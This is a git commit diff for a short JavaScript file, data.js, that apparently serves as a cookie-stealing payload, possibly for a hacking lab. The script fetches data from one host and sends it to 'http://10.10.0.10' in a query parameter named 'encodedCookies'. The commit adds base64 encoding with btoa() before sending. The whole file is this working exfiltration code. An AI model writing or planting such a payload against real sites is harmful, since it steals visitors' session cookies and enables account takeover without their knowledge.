862bb52017f3fe076d308abb07df10f7bcfc52d4
Lucius <ajlucea@hotmail.com>
2024-09-28 13:51:49 +0200

    Update data.js

--- data.js
+++ data.js
@@ -2,5 +2,5 @@ fetch("https://guitjapeo.thl/api/info")
   .then((response) => response.json())
   .then((data) => {
  
-    fetch(`http://10.10.0.10/?encodedCookies=${data})`);
+    fetch(`http://10.10.0.10/?encodedCookies=${btoa(data)})`);
   });
